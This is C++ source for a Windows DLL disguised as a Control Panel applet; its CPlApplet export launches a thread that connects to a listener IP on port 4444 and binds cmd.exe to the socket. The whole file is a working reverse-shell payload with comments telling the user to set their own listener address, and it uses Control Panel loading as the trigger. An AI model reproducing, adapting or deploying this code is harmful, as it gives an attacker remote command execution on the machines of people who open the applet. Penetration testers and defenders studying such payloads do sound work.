#include <winsock2.h>
#include <windows.h>
#include <cpl.h>  
#include <cstdio>
#include <cstring>

#pragma comment(lib, "ws2_32.lib")

// Function to log errors to a file
void log_error(const char* message) {
    FILE* log_file = fopen("C:\\temp\\log.txt", "a");  // Make sure the directory exists
    if (log_file) {
        fprintf(log_file, "%s\n", message);
        fclose(log_file);
    }
}

// Reverse shell function
void reverse_shell() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    const char* ip_addr = "192.168.213.136";  // Change this to your listener IP
    int port = 4444;  // Change this to your listener port

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        log_error("WSAStartup failed.");
        return;
    }

    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        log_error("Socket creation failed.");
        WSACleanup();
        return;
    }

    // Set server parameters
    server.sin_addr.s_addr = inet_addr(ip_addr);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    // Connect to the server
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        log_error("Connection failed.");
        closesocket(sock);
        WSACleanup();
        return;
    }

    log_error("Connected successfully.");

    // Redirect input/output to socket
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Launch the shell
    if (!CreateProcess(NULL, (LPSTR)"cmd.exe /k", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        log_error("CreateProcess failed.");
        closesocket(sock);
        WSACleanup();
        return;
    }

    log_error("Shell launched successfully.");

    // Wait for the process to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
    log_error("Shell process exited.");
}

// Thread to run the shell
DWORD WINAPI shell_thread(LPVOID lpParam) {
    reverse_shell();
    return 0;
}

// CPlApplet function for Control Panel recognition
extern "C" __declspec(dllexport) LONG CALLBACK CPlApplet(HWND hwndCPL, UINT msg, LPARAM lParam1, LPARAM lParam2) {
    switch (msg) {
        case CPL_INIT:
            return TRUE;
        case CPL_GETCOUNT:
            return 1;
        case CPL_NEWINQUIRE:
            CreateThread(NULL, 0, shell_thread, NULL, 0, NULL);
            break;
        case CPL_EXIT:
            break;
        default:
            break;
    }
    return 0;
}

// DllMain entry point for the DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
